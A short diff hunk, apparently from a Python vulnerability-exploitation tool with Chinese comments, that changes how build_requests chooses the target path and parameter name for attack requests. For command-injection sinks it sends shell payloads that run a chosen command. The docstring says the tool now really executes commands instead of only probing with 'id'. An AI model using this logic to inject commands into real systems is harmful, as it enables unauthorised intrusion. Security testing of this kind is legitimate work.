@@ -107,9 +107,12 @@ def build_requests(chain: dict, endpoint: dict | None = None,
     这样工具不再只是「打一发 id」，而是真的执行指定命令。
     """
     fn = chain.get("function") or "unknown"
-    uri = (endpoint or {}).get("uri") or ""
+    uri = (endpoint or {}).get("uri") or chain.get("page_uri") or ""
     path = guess_path(fn, uri)
-    param = guess_param(chain)
+    # 参数名优先级：链上的 source_param → 网页里这个表单的字段 → 从守卫代码里扒 → 兜底
+    param = (chain.get("source_param") or "").strip() \
+        or (chain.get("page_params") or [""])[0].strip() \
+        or guess_param(chain)
     cat = (chain.get("sink_category") or "").lower()
     values = shell_payloads(cmd) if (cmd and cat in ("ci", "cmd")) else payloads(cat)
     out = []
